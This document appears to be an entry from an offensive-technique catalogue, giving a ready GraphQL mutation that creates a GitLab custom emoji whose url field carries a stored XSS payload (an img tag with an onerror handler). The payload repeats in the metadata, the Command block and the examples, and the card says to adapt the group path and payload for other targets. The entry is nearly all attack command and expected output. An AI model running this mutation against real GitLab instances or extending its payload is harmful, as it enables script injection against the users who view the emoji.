---
data: >-
  mutation { createCustomEmoji(input: { groupPath: "xss_target",
  name:"xssreplace", url:"http://aaa#'><img onerror=alert(location) src=.>" }) {
  customEmoji { id name url } } }
tags:
  - graphql
  - xss
  - injection
type: command
output: 'JSON response with customEmoji details including id, name, url'
executor: graphql
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:56:03.650Z'
id: ee88bee9-29be-443a-9b8e-9e6612949ad2
verified: false
validated: true
submitted: true
---
# create-custom-emoji-graphql

## Command

```graphql
mutation { createCustomEmoji(input: { groupPath: "xss_target", name:"xssreplace", url:"http://aaa#'><img onerror=alert(location) src=.>" }) { customEmoji { id name url } } }
```

## Description

This GraphQL mutation creates a custom emoji in a specified GitLab group, injecting an XSS payload via the url parameter to exploit unescaped rendering.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `groupPath` | Path of the target group | Yes |
| `name` | Name of the emoji (e.g., 'xssreplace') | Yes |
| `url` | Malicious URL with XSS payload | Yes |

## Examples

### Basic Usage

```graphql
mutation { createCustomEmoji(input: { groupPath: "xss_target", name:"xssreplace", url:"http://aaa#'><img onerror=alert(location) src=.>" }) { customEmoji { id name url } } }
```

### Advanced Usage

Customize groupPath and payload for different targets.

## Expected Output

{"data":{"createCustomEmoji":{"customEmoji":{"id":"gid://...","name":"xssreplace","url":"http://aaa#'><img..."}}}}

## Related

- [[Related Procedure: Create-Malicious-Custom-Emoji-via-GraphQL]]
